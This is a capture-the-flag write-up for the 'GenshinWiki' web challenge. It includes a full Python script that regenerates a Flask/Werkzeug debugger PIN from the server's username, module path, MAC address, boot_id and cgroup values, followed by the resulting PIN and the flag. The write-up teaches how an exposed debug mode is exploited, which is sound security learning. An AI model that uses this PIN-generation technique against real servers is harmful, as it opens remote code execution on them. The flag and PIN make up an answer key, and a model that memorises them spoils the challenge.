## GenshinWiki (50 points)

#### Solved by hieplpvip

```
I just got addicted to this game recently, so I used all of my 3000 years of experience on web development to write a Wiki site for the game. No one could ever hack into the site.

Flag is located at ./flag.txt

https://mega.nz/folder/2ChQ2DSI#VdNk9pfUCk8bSYqycuWbqg

61.28.237.24:30104

Author: mugi
```

### Hint 1

```
The entrypoint file is /app/app.py
```

```py
import hashlib
from itertools import chain

pin = None
rv = None
num = None

probably_public_bits = [
    'root',  # username
    'flask.app',  # getattr(app, "__module__", app.__class__.__module__)
    'Flask',  # getattr(app, "__name__", app.__class__.__name__)
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'  # getattr(mod, '__file__', None),
]

private_bits = [
    '6715920611201',  # /sys/class/net/eth0/address 06:1b:ac:0f:f7:81
    'dbf077ce-54e0-4d88-ac07-f47d07882c48' +  # /proc/sys/kernel/random/boot_id
    'd21d6f31d96b014d5329148e3136f7931feb6e60863fd389998d62923b96d4da'  # /proc/self/cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(num[x:x + group_size].rjust(group_size, "0") for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)
```

PIN: `728-795-264`

**Flag:** `HCMUS-CTF{turn-off-debug-mode-pls}`
